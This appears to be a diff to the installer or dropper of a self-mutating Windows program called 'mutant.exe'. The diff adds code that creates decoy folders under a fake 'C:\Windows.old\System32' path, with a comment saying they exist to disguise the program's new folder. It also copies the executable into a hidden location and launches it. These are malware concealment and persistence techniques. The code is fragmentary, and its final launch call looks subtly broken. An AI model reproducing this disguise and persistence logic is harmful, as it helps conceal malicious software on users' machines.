@@ -89,8 +89,15 @@ int main(void)
 	
 	//Move mutation engine to Startup directory
 	strcpy(src, "mutant.exe");
-	strcpy(dest, getenv("USERPROFILE"));
-	strcat(dest, "\\Documents\\Tax Returns");
+	strcpy(dest, "C:\\logs");
+	
+	//Create some fake directories to disguise potential new folder
+	CreateDirectory("C:\\Windows.old\\System32\\config", NULL);
+	CreateDirectory("C:\\Windows.old\\System32\\DriverState", NULL);
+	CreateDirectory("C:\\Windows.old\\System32\\en-us", NULL);
+	CreateDirectory("C:\\Windows.old\\System32\\inetsrv", NULL);
+	CreateDirectory("C:\\Windows.old\\System32\\SecureBootUpdates", NULL);
+	CreateDirectory("C:\\Windows.old\\System32\\winevt", NULL);
 	
 	if(CreateDirectory(dest, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
 	{
@@ -100,7 +107,8 @@ int main(void)
 		
 		if(in == NULL || out == NULL)
 		{
-			cout << "Error copying mutant.exe to destination folder";
+			cout << "Error copying mutant.exe to destination folder: ";
+			cout << "Read/write files could not be opened.";
 			cout << endl;
 		
 			in = out = 0;
@@ -121,14 +129,13 @@ int main(void)
 	}
 	else
 	{
-		cout << "Error copying mutant.exe to destination folder";
+		cout << "Error copying mutant.exe to destination folder: ";
+		cout << "Directory could not be created.";
 		cout << endl;
 	}
 	
 	//Start mutation engine
-	cout << dest << endl;
-	system(dest.c_str());
-	cout << dest << endl;
+	system(dest);
 	
 	return 0;
 }
